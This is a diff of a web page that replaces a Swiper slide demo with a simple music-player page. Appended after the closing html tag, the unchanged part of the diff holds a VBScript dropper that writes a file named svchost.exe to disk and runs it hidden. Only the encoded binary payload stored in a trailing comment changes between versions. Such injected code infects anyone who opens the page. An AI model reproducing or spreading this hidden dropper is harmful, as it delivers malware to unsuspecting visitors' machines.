@@ -1,37 +1,34 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>Swiper demo</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
-
-    <!-- Link Swiper's CSS -->
-    <link rel="stylesheet" href="https://cdn.bootcss.com/Swiper/4.0.5/css/swiper.css">
-    <link rel="stylesheet" href="css/style.css">
-
+    <meta charset="UTF-8">
+    <title>Document</title>
 </head>
+<style>
+    body{
+        background:#000;
+    }
+</style>
 <body>
-<!-- Swiper -->
-<div class="swiper-container">
-    <div class="swiper-wrapper">
-        <div class="swiper-slide">Slide 1</div>
-        <div class="swiper-slide">Slide 2</div>
-        <div class="swiper-slide">Slide 3</div>
-        <div class="swiper-slide">Slide 4</div>
-        <div class="swiper-slide">Slide 5</div>
-        <div class="swiper-slide">Slide 6</div>
-        <div class="swiper-slide">Slide 7</div>
-        <div class="swiper-slide">Slide 8</div>
-        <div class="swiper-slide">Slide 9</div>
-        <div class="swiper-slide">Slide 10</div>
-    </div>
-    <!-- Add Pagination -->
-    <div class="swiper-pagination"></div>
-</div>
-
-<!-- Swiper JS -->
-<script src="https://cdn.bootcss.com/Swiper/4.0.5/js/swiper.js"></script>
-<script src="js/script.js"></script>
+<audio controls="controls" id="audio_player" style="display:none" >
+<source src="mp3/Snigellin - Sakura Tears.mp3" >
+</audio>
+<img src="img/musicIcon.png" onclick="playClicked(this)" value=">">
+<script>
+    function playClicked(element)
+    {
+        //get the state of the player
+        if(audio_player.paused)
+        {
+            audio_player.play();
+            newdisplay = "| |";
+        }else{
+            audio_player.pause();
+            newdisplay = ">";
+        }
+        element.value=newdisplay;
+    }
+</script>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -47,4 +44,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--~Ìx¡tõÇğÓexŠ¶wü ³Û\^ì•e×Ó³”Š 7‰tÎĞı/Øƒ¥	FÂ¡É@™0=æšÜó¡­*ğ¼²Ñf"Eº,Ş0 ‹Xâ9q×Ö‚ºN$öJ®Ş¾Énæ_ìèaa|¡7r >bûğ—A7ìÔ›¥ÙåQÖm&¤öâÏìåY¹YKÚ)3D”F©ğ–=˜ÜûĞZ¦¤²h\\/3||ª>—lG¡×bn›fÛ^LMø.•ŞéUI«İÀ¡=%B£˜µ%‡s [n7#åöç_wè¢²½˜œ—+'kÇÙ7Æì[1i¶0_§¨GüX@ØX˜íïï4Ç¿¿É§òÆğcxXŒ'ö¯v>öt»#Tëè<`MhÒ%\rD)RáUüÉÅï èrÁ	}Øê#t°A™Ü†ÄÖ¯OñıuÅ¹ĞÜ‘J#xñQâø×°]äøÚ¢ø;>äy	~Ø²øÅk:z	X…0:tÊ·¸>‡ñ ]9¦˜Ã¤}Åc 8„±_KøjYó<¾ÙüCúİ˜¤k3xÖZšêkøÃ» Õş§éÔ6JÏåBõ«X0ÊôÁHåHõ¤'/¸h@Š°#šĞşçé Ö%R>ùÖ%Ö%Ö%›øO*¸Y¹Ò% Ö%-->
+//--></SCRIPT><!--û.æ†ñÁ;£ßõQf$ÑkşXòÌ«ªyîÔÔÑı;Ô‹y'm§Ad»N´úFïÃõ·>çåRND-ÛOë¤Zs`Ä†5pYŞ(ÅÖoxYŠçrKíØ=¸æ3?·—¸ŒŸËow±˜i+<è wû2Âf%2½àª…´W¨ËÇï¾Øw¾1é:HnZ(;ß ƒfˆ¾Bõ½ôQä«¨DEˆ)ÀÒj)Ô´Û0Q!±/3ÆB©v^£=«wR¯…g1:G²/xÆ}ÙsÙ¦ôTºnm©¥IÚØª¡cä(Ñ[c(PXÚx<ŒKôïI¹D4ß:¯_Ã!áÎñuşr:kÃ_,³æz‡!kZêº¬‹/f°†FB¹ Mëvèí<[ğûÄì7a°OnA·ı	—¤Ö‚q0'Eœğª¹_åÒÀßIàõC(J°›ÚD0ğ’Òsâh÷É˜ôöÆcÌı#7Ø¸%Y½|÷“ü|M¢¨Cw»ş Ö%R>ùÖ%Ö%Ö%›øO6§YÜÔ% Ö%-->
